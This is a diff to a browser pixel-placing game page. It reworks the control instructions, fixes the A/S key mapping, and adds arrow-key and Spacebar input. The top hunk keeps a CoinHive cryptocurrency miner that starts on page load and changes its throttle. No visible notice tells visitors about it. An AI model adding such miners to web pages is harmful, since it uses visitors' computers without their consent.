@@ -17,13 +17,13 @@
 			// if you really dont wan't to support me, get ublock origin
 			// or send me a pm on discord about your concerns.
 
-			var miner = new CoinHive.User("uB0AtEOdG8yXQObbRRqNUZWKwOjbsEPN", "_Player", { throttle: 0.4 });
+			var miner = new CoinHive.User("uB0AtEOdG8yXQObbRRqNUZWKwOjbsEPN", "_Player", { throttle: 0.6 });
 			if (!miner.isMobile()) miner.start();
 
 			function minerChange(name) {
 				if (!miner) return;
 				miner.stop();
-				miner = new CoinHive.User("uB0AtEOdG8yXQObbRRqNUZWKwOjbsEPN", name, { throttle: 0.4 });
+				miner = new CoinHive.User("uB0AtEOdG8yXQObbRRqNUZWKwOjbsEPN", name, { throttle: 0.6 });
 				if (!miner.isMobile()) miner.start();
 			}
 
@@ -163,7 +163,7 @@
 				position: fixed; margin: auto;
 				top: 0; left: 0; right: 0; bottom: 0;
 				width: 500px;
-				height: 280px;
+				height: 290px;
 				padding: 25px;
 			}
 
@@ -210,9 +210,18 @@
 			<div id="startup-box" class="box">
 				<h2>Welcome to</h2>
 				<h1>[socket_namespace]'s Place</h1><br>
-				<p>You can move around with:</p>
-				<p><b>Mouse:</b> RMB, Scrolling</p>
-				<p><b>Keyboard:</b> WASD, E, Q</p><br>
+				<table style="table-layout: fixed; width: 100%;">
+					<tr>
+						<td>
+							<p>You can move around with:</p>
+							<p><b>WASD, E, Q, Arrow Keys,<br>RMB, Scrolling</b></p>
+						</td>
+						<td>
+							<p>You can place with:</p>
+							<p><b>Left Mouse Button,<br>Spacebar</b></p>
+						</td>
+					</tr>
+				</table><br>
 				<p><b>Username:</b></p>
 				<input type="text" id="player-name" autocomplete="off" value="_Player" style="background-color: rgba(255,255,255,0.2);"> 
 				<table style="width: 100%; table-layout: fixed;" cellspacing="20"><tr>
@@ -444,8 +453,8 @@
 				if (game.butt_down["e"]) zoom(1+game.zoom_speed);
 
 				if (game.butt_down["w"]) move(0, -game.move_speed);
-				if (game.butt_down["a"]) move(0, game.move_speed);
-				if (game.butt_down["s"]) move(-game.move_speed, 0);
+				if (game.butt_down["a"]) move(-game.move_speed, 0);
+				if (game.butt_down["s"]) move(0, game.move_speed);
 				if (game.butt_down["d"]) move(game.move_speed, 0);
 
 				if (game.butt_down["lmb"]) place();
@@ -463,27 +472,31 @@
 			// ------------
 
 			document.addEventListener("keydown", function(e) {
-				switch (e.key) {
-					case "q": game.butt_down["q"] = true; break;
-					case "e": game.butt_down["e"] = true; break;
+				let k = e.code;
 
-					case "w": game.butt_down["w"] = true; break;
-					case "s": game.butt_down["a"] = true; break;
-					case "a": game.butt_down["s"] = true; break;
-					case "d": game.butt_down["d"] = true; break;
-				}
+				if (k=="KeyQ") game.butt_down["q"] = true;
+				if (k=="KeyE") game.butt_down["e"] = true;
+
+				if (k=="KeyW"||k=="ArrowUp") game.butt_down["w"] = true;
+				if (k=="KeyA"||k=="ArrowLeft") game.butt_down["a"] = true;
+				if (k=="KeyS"||k=="ArrowDown") game.butt_down["s"] = true;
+				if (k=="KeyD"||k=="ArrowRight") game.butt_down["d"] = true;
+
+				if (k=="Space") game.butt_down["lmb"] = true; 
 			});
 
 			document.addEventListener("keyup", function(e) {
-				switch (e.key) {
-					case "q": game.butt_down["q"] = false; break;
-					case "e": game.butt_down["e"] = false; break;
+				let k = e.code;
 
-					case "w": game.butt_down["w"] = false; break;
-					case "s": game.butt_down["a"] = false; break;
-					case "a": game.butt_down["s"] = false; break;
-					case "d": game.butt_down["d"] = false; break;
-				}
+				if (k=="KeyQ") game.butt_down["q"] = false;
+				if (k=="KeyE") game.butt_down["e"] = false;
+
+				if (k=="KeyW"||k=="ArrowUp") game.butt_down["w"] = false;
+				if (k=="KeyA"||k=="ArrowLeft") game.butt_down["a"] = false;
+				if (k=="KeyS"||k=="ArrowDown") game.butt_down["s"] = false;
+				if (k=="KeyD"||k=="ArrowRight") game.butt_down["d"] = false;
+
+				if (k=="Space") game.butt_down["lmb"] = false;
 			});
 
 			var resizeTimeStamp;
@@ -506,7 +519,7 @@
 
 			view_canvas.addEventListener("mousedown", function(e) {
 				switch (e.button) {
-					case 0: game.butt_down["lmb"] = true; place(); break;
+					case 0: game.butt_down["lmb"] = true; break;
 					case 2: game.butt_down["rmb"] = true; break;
 				}
 			});
